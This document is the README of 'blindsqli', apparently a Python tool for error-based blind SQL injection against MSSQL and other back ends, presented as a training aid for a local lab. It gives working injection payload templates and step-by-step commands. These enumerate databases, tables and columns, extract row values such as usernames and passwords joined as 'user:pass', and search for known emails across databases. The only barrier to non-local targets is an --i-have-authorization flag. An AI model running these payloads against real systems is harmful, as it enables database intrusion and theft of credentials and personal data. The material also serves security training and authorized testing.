# blindsqli

A modular command-line tool for **boolean / error-based blind SQL injection
data exfiltration**, built for a *local* intentionally-vulnerable training
application (e.g. `http://localhost:3000`).

The tool decides whether a SQL condition is true or false purely from the
**observable behaviour of the response** (an error vs. a normal page), using the
`CASE WHEN <condition> THEN 1 ELSE 'a' END` type-confusion technique. It never
uses the application's conventional/direct SQL injection path to read data — the
only data-retrieval channel is the boolean/error side channel.

> **Scope and safety.** This is a security *training* tool. It refuses to target
> non-local hosts unless you explicitly assert authorization (`--i-have-authorization`).
> Use it only against systems you own or are authorized to test. See
> [Safety and scope](#safety-and-scope).

> **New here?** Read [GETTING_STARTED.md](GETTING_STARTED.md) for a plain,
> copy-paste, step-by-step walkthrough.

> **Using Burp Suite?** The [`burp_sqli/`](burp_sqli/README.md) extension exports
> a selected Burp request straight into a `blindsqli` config file.

---

## Why Python?

The brief asked to evaluate languages against these needs: easy HTTP, efficient
concurrency, modularity, statistical/probabilistic processing, extensibility,
clear CLI, and robust error/timeout handling.

| Need | Python | Go | Rust |
|---|---|---|---|
| HTTP ergonomics | `requests`, stdlib | good (`net/http`) | good, more ceremony |
| Concurrency for **I/O-bound** work | thread pool releases the GIL during network waits | goroutines (excellent) | async, steeper |
| Statistical/probabilistic code | first-class (dicts, `math`, easy models) | verbose | verbose |
| Extensibility / rapid iteration | very high | medium | lower |
| CLI & config | `argparse`, JSON/YAML | good | good |
| Testing story | `pytest`, trivial fakes | good | good |

The workload is **I/O-bound** (each oracle question is one HTTP round-trip), so
Python's threaded worker pool gives real concurrency: the GIL is released while
sockets wait. Combined with Python's strength for the probabilistic prediction
models and its low-friction modularity and testing, Python is the best fit here.
Go would be the runner-up if raw throughput dominated; it does not, because the
target's latency, not the client's CPU, is the bottleneck.

---

## Install

```bash
cd sqli-blind-exfil
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt        # runtime (requests, optional PyYAML)
# for tests:
pip install -r requirements-dev.txt
```

Python 3.9+ is required. The package is importable as `blindsqli` and exposes a
CLI (`python -m blindsqli ...`, or `blindsqli` if installed with `pip install -e .`).

---

## Quick start against the bundled mock target

You do not need the real lab to try the tool. A faithful local mock reproduces
the CASE true/false behaviour.

Terminal 1 — start the mock on port 3000:

```bash
python mock_target.py --port 3000 --secret jun_users
```

Terminal 2 — first, inspect how true and false responses differ:

```bash
python -m blindsqli calibrate --url http://localhost:3000/ --param q
```

```json
{
  "ok":   {"status": 200, "length": 155, "elapsed": 0.001},
  "error":{"status": 500, "length": 165, "elapsed": 0.001},
  "distinguishable_by": ["status", "length", "body"]
}
```

Then extract the first table name:

```bash
python -m blindsqli extract \
  --url http://localhost:3000/ --param q \
  --preset first-table --workers 10 -v
```

You will see live progress and, at the end, the recovered value written to
`exfil_result.json`:

```json
{ "target": "TABLE_NAME[0]", "value": "jun_users", "complete": true, "length": 9, ... }
```

---

## Running against the bundled lab (localhost:3000)

Verified against the local "Blind SQLi Lab" (an MSSQL back end) whose vulnerable
endpoint is `GET /search?q=`. Two lab-specific details, both discovered by
probing first (as the brief requires):

- The error side channel is a **type-conversion / runtime error**: a valid query
  returns HTTP 200; a false CASE branch raises a SQL error and returns HTTP 500.
- The predicate is only evaluated when the injected row exists, so the payload
  prefix uses a **real username** (`juniper'`), not `a'`.
- MSSQL's default collation is case-insensitive; the `mssql` dialect forces
  `COLLATE Latin1_General_BIN` on character comparisons so case and ordering are
  exact.

```bash
python -m blindsqli extract \
  --url http://localhost:3000/search --param q \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql --preset first-table --workers 10 -v
```

Result (auto-calibrated TRUE=200 / FALSE=500, extracted through the error
channel only):

```json
{ "target": "TABLE_NAME[0]", "value": "jun_notes", "complete": true, "length": 9,
  "requests_completed": 92, "requests_failed": 0 }
```

Enumerating all three tables with a shared engine shows the adaptive model
learning the recurring `jun_` prefix — each successive name costs fewer
requests: `jun_notes` (89), `jun_roles` (66), `jun_users` (61).

## Boolean TRUE / FALSE detection examples

The oracle maps an observable **non-error** response to `TRUE` and an
**error** response to `FALSE`:

```text
condition                       payload sent                                             oracle
------------------------------  -------------------------------------------------------  ------
(TABLE_NAME) LIKE 'jun%'        a' AND 1=(SELECT CASE WHEN (... LIKE 'jun%' ...) ...)--   TRUE   (200, normal page)
(TABLE_NAME) LIKE 'xyz%'        a' AND 1=(SELECT CASE WHEN (... LIKE 'xyz%' ...) ...)--   FALSE  (500, "Conversion failed ...")
```

Programmatically:

```python
from blindsqli.config import Config
from blindsqli.oracle import BooleanOracle
from blindsqli.dialect import get_dialect
from blindsqli.targets import first_table_name

cfg = Config(target_url="http://localhost:3000/", injection_param="q")
oracle = BooleanOracle(cfg); oracle.calibrate()
t = first_table_name(get_dialect("mssql"))
print(oracle.test(t.starts_with("jun")))  # OracleResult.TRUE
print(oracle.test(t.starts_with("xyz")))  # OracleResult.FALSE
```

---

## Extracting the first table name (real lab)

```bash
python -m blindsqli extract \
  --url http://localhost:3000/ \
  --param q \
  --base-payload "a' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)--" \
  --dialect mssql \
  --preset first-table \
  --workers 10 \
  --output first_table.json \
  -v
```

If auto-calibration cannot find a side channel it will tell you, so you can
inspect the app and tune `--base-payload`, `--param`, or the classifier config.

## Extracting ALL table names

`extract --preset first-table` recovers only the first table. To get **every**
table name, use the `enumerate` command: it discovers the row count and then
extracts each name, reusing one engine so the character/sequence predictors keep
learning across names (later `jun_` names cost fewer requests).

```bash
python -m blindsqli enumerate \
  --url http://localhost:3000/search --method POST \
  --body-mode json --param "[0].value" --json-template '[{"value":"juniper"}]' \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql --output all_tables.json -v
```

Output is a JSON list:

```json
{ "what": "tables", "count": 3,
  "values": ["jun_notes", "jun_roles", "jun_users"] }
```

Enumerate a table's columns with `--what columns --table jun_users`, and cap the
number of rows with `--limit N`.

### Choosing a database

`INFORMATION_SCHEMA` only sees the **current** database, so plain table
enumeration returns just that one database's tables. To work across databases:

```bash
# list every database on the server (MSSQL sys.databases)
python -m blindsqli enumerate --what databases ...

# then scope table/column enumeration to a specific one (three-part naming)
python -m blindsqli enumerate --what tables  --database LabDB ...
python -m blindsqli enumerate --what columns --table jun_users --database LabDB ...
```

`--database` also works on `extract --preset first-table`. Against the local lab
this lists `LabDB` plus the MSSQL system databases, and scoping to `LabDB` vs
`master` returns entirely different table sets.

### Extracting column values (and concatenating columns)

`--what rows` extracts the actual data. Give `--columns` a comma list; multiple
columns are concatenated per row with `--sep` (via `CONCAT`, so a `username` and
a `password` column come out as `user:pass`):

```bash
python -m blindsqli enumerate --what rows \
  --database LabDB --table jun_users --columns "dan_username,dan_email" --sep ":" ...
# -> ["atlas:atlas@example.com", "daniel:daniel@example.com", ...]
```

For a single scalar, `extract --expr "(SELECT CONCAT(u,':',p) FROM ... WHERE ...)"`
still works. Extras for `--what rows`: `--where "id>0"`, `--order-by col`,
`--schema` (default `dbo`), and `--row-expr` for a fully custom expression
(e.g. a hash). Row extraction automatically widens the character set to
printable ASCII (emails, passwords contain punctuation the identifier default
omits); override with `--charset` if needed.

### Remembering what was already extracted

Pass `--knowledge FILE` to any `extract` or `enumerate` run. Before the run the
file's values seed the predictors; after it, the newly-found values are merged
back as a **deduplicated set**. Because the sequence predictor proposes a known
value as a whole-string hypothesis, a value the tool has seen before is
confirmed in roughly a single request instead of being rebuilt character by
character. Re-running the enumeration above against the local lab drops from 234
requests to 45, and every row comes back flagged `already_known`, with
`new_values` listing only what was not in the file yet.

```bash
python -m blindsqli enumerate ... --knowledge known.json
```

### Verifying a target exists before extracting it

A scalar subquery that selects nothing returns `NULL`. The engine now **checks a
target exists before iterating character by character**, so a row that is not
there costs a single request instead of a full, futile search:

- **Automatic.** Length discovery distinguishes "NULL / absent" from "longer than
  `max_length`" with one existence probe. A missing target is reported with
  `"exists": false` and `"complete": false` instead of triggering a max-length
  extraction. In a quick benchmark a missing target dropped from ~78 requests to
  **2**.
- **Explicit.** Pass `--verify-exists` to `extract` to probe up front (a missing
  target then costs exactly **1** request), or to `enumerate` to skip `NULL`
  cells cheaply. NULL rows are reported as `<NULL> (skipped)` and are not counted
  as extraction failures.

```bash
# a row that may not exist: confirm first, don't waste a full search on it
python -m blindsqli extract --url ... --verify-exists \
    --target-name user --expr "(SELECT username FROM users WHERE id=99999)"
# -> { "value": "", "exists": false, "complete": false, ... }
```

The result's `exists` field is `true` when a value was recovered, `false` when
the target was proven NULL/absent, and `null` when existence was not probed.

---

## Finding where known values live (cross-scope value search)

When you know several values but not where any of them are stored, the `search`
command locates each one across the authorized scope. It **discovers metadata
once**, ranks the most likely columns for each keyword with heuristics, and
confirms only the promising ones through the boolean oracle. Discovery is
separated from extraction, so you narrow the search space before spending
expensive blind requests, and nothing is dumped wholesale.

```bash
# one value
python -m blindsqli search --url http://localhost:3000/ --param q \
    --keyword alice@example.com

# many values from a file, restricted to two databases, results saved
python -m blindsqli search --url http://localhost:3000/ --param q \
    --keywords-file keywords.txt \
    --databases appdb,billing \
    --meta-file scope.json \          # metadata index: reused on later runs
    --results-file matches.json
```

Each keyword is an **independent** investigation; results are kept per keyword
and never merged into one query. A confirmed match records the database, schema,
table, column, a ready-to-use `WHERE` clause, confidence and a timestamp, so you
can hand it straight to targeted extraction:

```bash
# a confirmed match at billing.dbo.customers.email -> pull the matching rows
python -m blindsqli enumerate --url ... --what rows \
    --database billing --table customers --columns id,email \
    --where "email LIKE '%alice@example.com%'"
```

### Keyword files

One keyword per line. Blank lines and `#` comments are ignored; a `# Heading`
line tags the keywords beneath it; `#!` sets defaults; per-keyword options come
after ` ;; `:

```text
# Accounts                 (this heading tags the two lines below)
admin
alice@example.com

#! mode=substring case=insensitive
invoice ;; exact           (this one is an exact, whole-value match)
project-x ;; tag=infra
```

### Controlling cost

Every blind request is expensive, so `search` estimates the scope first
(keywords x databases x tables x columns) and prints a cost level before doing
the work:

```text
Estimated search scope:
  Keywords:                     2
  Databases:                    3
  Tables:                       9
  Columns (known):             27
  Candidates/keyword:           5
  Confirmation requests: ~     10
  Cost level:            LOW
```

Ranking plus `--max-candidates N` (default 50) bound the cost: only the N most
likely columns per keyword are tested. `--estimate-only` stops after the
estimate; `--exhaustive` tests every column (can be very slow); `--search-workers
N` searches independent keywords concurrently; `--count-rows` also counts
matching rows per hit; `--stop-after K` stops a keyword after K confirmations.

### Interactive wizard

`wizard` guides the whole workflow (discover -> filter -> discover deeper ->
extract, or load keywords -> search) and remembers what was discovered and
selected, so you don't have to memorise flags:

```bash
python -m blindsqli wizard --url http://localhost:3000/ --param q \
    --meta-file scope.json --results-file matches.json
```

```text
What would you like to do?
  1. Discover databases
  2. Discover tables
  3. Discover columns
  4. Extract a specific object
  5. Search for known values
  6. Load a keyword file
  7. Review previous discoveries
  8. Estimate search scope / cost
  9. Save session (metadata + results)
  0. Quit
```

At each stage it offers the logical next steps and lets you narrow by index, an
exact name, or a `LIKE` pattern (`%user%`). See
[WIZARD_AND_SEARCH.md](WIZARD_AND_SEARCH.md) for a full walkthrough.

---

## Configuration

Everything environment-specific is configurable via flags or a JSON/YAML file
(`--config config.example.yaml`). Precedence: **defaults < config file < flags**.

Key options (see `config.example.yaml` for the full set):

| Option | Meaning |
|---|---|
| `target_url`, `injection_param`, `http_method` | where and how to inject |
| `proxy`, `proxy_insecure` | route requests through an intercepting proxy; optionally skip TLS verification |
| `body_mode` | `auto` (query for GET, form for POST), `form`, `json`, or `raw` |
| `json_template`, `body_template`, `content_type` | JSON base body / raw body template / content-type override |
| `base_payload` | payload template containing `{condition}` |
| `request_timeout`, `max_retries`, `retry_backoff`, `ambiguous_retries` | reliability |
| `workers` | bounded worker-pool size |
| `charset`, `max_length` | search space |
| `strategy` | `adaptive` (default), `linear`, or `binary` |
| `target_expression`, `dialect` | what SQL scalar to exfiltrate, and its dialect |
| `classifier.*` | error-detection rules (status/body/length/headers/timing) |
| `verbosity`, `output_file` | logging and machine-readable output |
| `knowledge_file` | JSON set of previously-extracted values, loaded to seed prediction and updated (deduplicated) after the run |

The **classifier** can detect the error condition from any combination of HTTP
status, body signatures/regexes, body length, headers and response timing. When
you supply no explicit rules, the oracle **auto-calibrates** by sending a known
`1=1` and `1=2` and learning the fingerprint — this is how the tool "inspects
the target" before extracting, instead of assuming an HTTP error format.

---

### Routing through a proxy

To watch the tool's traffic in an intercepting proxy such as Burp or ZAP:

```bash
python -m blindsqli extract --url http://localhost:3000/search --param q \
  --preset first-table --proxy http://127.0.0.1:8080
# add --proxy-insecure if the proxy presents a self-signed TLS certificate
```

The explicit `--proxy` takes precedence over `HTTP_PROXY`/`HTTPS_PROXY` and is
**not** bypassed for loopback targets (unlike the environment variables), so a
local lab is captured as expected. The scope guard still applies to the target
URL, not the proxy.

### Injecting into a JSON body

When the vulnerable parameter lives in a JSON request body, only the transport
changes; detection, calibration and the adaptive search are identical. Use
`--body-mode json` and give `--param` as a dotted key path:

```bash
python -m blindsqli extract --url http://host/api/search --method POST \
  --body-mode json --param creds.username \
  --json-template '{"page":1}' --preset first-table
```

That sends `{"page":1,"creds":{"username":"<payload>"}}`. The value is placed
via a real JSON encoder, so SQL quotes and backslashes are escaped correctly.

The path supports **array indices** too, so a body that is a top-level array
like `[{"code":"X","vulnerableParam":"1"}]` is reached with
`--param '[0].vulnerableParam'` (segments: `data.items[2].name` also works).

For non-standard bodies (nested arrays, GraphQL, XML) use a raw template with a
placeholder — `{value_json}` is JSON-string-escaped, `{value}` is verbatim:

```bash
python -m blindsqli extract --url http://host/api --method POST \
  --body-mode raw --body-template '{"q":"{value_json}"}' \
  --content-type application/json --preset first-table
```

## Stopping early

A run can be stopped at any time with **Ctrl+C**, even far from completion:

- **First Ctrl+C** asks the engine to stop cleanly at the next checkpoint. It
  finishes safely, keeps everything recovered so far, writes the output file
  (with `"cancelled": true` / `"stopped": true` and the partial value), and for
  `enumerate` keeps the rows already collected. Exit code is 1.
- **Second Ctrl+C** force-quits immediately (exit 130); partial progress from
  the in-flight step is not saved.

Fully-recovered values are still written to `--knowledge`; partial ones are not.

## Reliability model

Every oracle question resolves to one of:

```text
TRUE            observable non-error response
FALSE           observable error response
REQUEST_ERROR   connection/transport failure (after retries)
TIMEOUT         no response in time (after retries)
UNKNOWN         classifier could not decide (after retries)
```

A network failure is **never** silently treated as `FALSE`. Ambiguous results
are retried; if a character still cannot be resolved, extraction stops and the
result is reported as partial with `undetermined_at` set. Run with `-vvv` for
per-request diagnostics explaining each classification.

---

## Architecture (short)

```text
Target/Query Definitions  ->  Boolean SQL condition
        ->  Payload Builder  ->  HTTP Client  ->  Response/Error Classifier
        ->  Boolean Oracle (TRUE/FALSE/…)  ->  Exfiltration Engine
                 ^                                   |
   Character Predictor + Sequence Predictor  <-------+  (learn & rank)
```

Each box is an independent module with a narrow interface, so, for example, the
classifier can be swapped without touching the prediction engine. Full details
in [ARCHITECTURE.md](ARCHITECTURE.md). To add new things to extract (database
name, columns, field values), see [ADDING_TARGETS.md](ADDING_TARGETS.md).

---

## Testing

```bash
pytest                      # unit tests (no network needed for most)
pytest tests/test_integration.py   # full stack over HTTP against the mock
```

Unit tests cover payload generation, condition construction, classification,
retry behaviour, concurrency (ordering + bounded pool), character prediction,
sequence/pattern prediction, cost-based strategy selection, and termination.
The integration test spins up the local mock and extracts a table name end to
end. Tests that need `requests` are skipped automatically if it is absent.

---

## Troubleshooting

**"binary search converged on 'z' … verification failed"** (or any character
that comes out wrong). In error-based blind SQLi an *invalid* SQL condition
returns the error page too, so a malformed comparison is read as FALSE and the
search drifts to the end of the charset. The tool now falls back to an
order-independent equality scan automatically, but if that also fails the
condition is genuinely not valid for the target. Usual causes and fixes:

- **Wrong dialect.** The default is MSSQL. If the backend is MySQL/Postgres,
  pass `--dialect mysql` / `--dialect postgres`.
- **Unsupported collation.** MSSQL comparisons are forced to
  `COLLATE Latin1_General_BIN` for exact case/order. If that collation name is
  not valid on the target, pass `--no-collation` (or `--collation <name>`).
- **Character outside the charset.** Widen `--charset`.

**Both true and false return the same status; only Content-Length differs, but
the search skips the right character.** If the page **echoes the submitted
payload**, a longer extraction payload inflates the body and skews a raw length
comparison, so a true response is misread as false. The classifier strips the
sent payload (raw, URL-encoded and HTML-escaped forms) from the body before
measuring length and markers, so only the genuine true/false difference counts.
If your target reflects the payload in some other encoding, pin an explicit
`error_body_signatures` in the config instead.

## Safety and scope

- Targets are checked against a loopback allowlist. Non-local hosts are refused
  unless you pass `--i-have-authorization`, which is an explicit assertion that
  you are authorized to test that host.
- The tool implements **only** the boolean/error side channel. It does not use
  the app's conventional SQLi path to read data directly, and it has no feature
  for discovering or scanning arbitrary external hosts.
- Discovery, the metadata index and the value search are **read-only**: they use
  `INFORMATION_SCHEMA`/`sys.databases` reads, `COUNT`/`OFFSET` selects and
  `LIKE`/`=` comparisons only. The tool never creates, alters, inserts or drops
  anything; the metadata index and results are ordinary local JSON files you
  control, not database objects. Persisting any state to the target would need a
  deliberate, unsupported change.
- The scope allowlist applies to every command, including `search` and `wizard`.
  Keywords are searched only within the authorized target, and each keyword is an
  independent lookup -- values are never correlated into one query unless you
  build that query yourself.
- Intended use: learning and authorized testing against a local vulnerable lab.
